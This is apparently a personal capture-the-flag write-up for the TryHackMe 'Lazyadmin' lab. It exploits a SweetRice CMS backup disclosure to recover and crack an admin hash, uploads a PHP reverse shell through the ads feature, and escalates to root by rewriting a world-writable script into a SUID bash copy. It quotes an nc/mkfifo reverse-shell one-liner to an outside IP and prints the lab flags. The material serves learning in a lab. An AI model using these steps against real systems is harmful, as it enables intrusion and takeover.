---
title: "Lazyadmin"
date: 2025-01-10
slug: lazyadmin
tags: [tryhackme, windows, web, privesc]
difficulty: Easy
---
IP = 10.10.70.138

enumeration - 
`nmap -sCV 10.10.70.138`
22 and 80 open 

`gobuster dir -u http://10.10.70.138 -w ../ctf/wordlist/medium.txt`
`gobuster dir -u http://example.com -w /path/to/wordlist.txt -x php,html,js
`
dir found was /contents 
which had info that sweetrice is running on the system 

also find for dir inside contents using 
`gobuster dir -u http://10.10.70.138/contents -w ../ctf/wordlist/directory-list-2.3-medium.txt
`

searching for exploits for sweetrice 
`searchsploit sweetrice`

in all the given exploits the exploit named backup disclosure seems to be most relevant 

```txt
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

going to 
`http://10.10.70.138/content/inc/mysql_backup/`
we get 
![[Pasted image 20250110192457.png]]
download the .sql file and cat it 
```
cat mysql_bakup_20191129023059-1.5.1.sql | grep passwd
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

```
passwd// 42f749ade7f9e195bf475f37a44cafcb
this line can be helpful 
using crackstation 
![[Pasted image 20250110193056.png]]

**Password123**
uname - manager 

![[Pasted image 20250110205414.png]]
after logging in we get many tabs but in that there is a ads tab which has name and a code so here is a space for entering malicious code 

using the script `php-reverseshell.php`
copying the entire code changing the port and ip (tun0)
and pasting it in the ads code 

spawning listner on own machine by using 
`rlwrap nc -lnvp 9999`
rlwrap - good util for a shell with better functions 
![[Pasted image 20250110210607.png]]

go to `http://10.10.70.138/content/inc/ads/` and execute the script by clicking on it and u should receive a reverse shell req 
![[Pasted image 20250110210638.png]]
after getting reverse shell connection just cat the user.txt in home dir 
`THM{63e5bce9271952aad1113b6f1ac28a07}`

**privilege escalation** 
```
sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
we only have nopasswd access to one command 
` /usr/bin/perl /home/itguy/backup.pl`
which means that we can execute backup.pl file using perl language 

lets check what is in backup.pl

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

```
it is perl script
this script runs a external command which is .
`sh /etc/copy.sh`

lets see what is in copy.sh
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`
it is a random code 

after checking the file permissions we understand that we have no permission to modify the backup.pl file but we can modify the copy.sh file in the system 
`ls -al /etc/copy.sh
`-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh`

using the ==rootbash== technique
`echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /etc/copy.sh`
copying the bash binary into tmp dir by name rootbash and updating it by giving it SUID and writing this command inside copy.sh so we can run it without any issues 
the rootbash takes -p to run 

```
$sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ sudo /usr/bin/perl /home/itguy/backup.pl
$ ls /tmp
rootbash
systemd-private-59f8f636e725427d832fafa08152f8f2-colord.service-1YeYGP
systemd-private-59f8f636e725427d832fafa08152f8f2-rtkit-daemon.service-JHL2tW
$ /tmp/rootbash -p
whoami
root
cat /root/root.txt

```

`THM{6637f41d0177b6f37cb20d775124699f}`
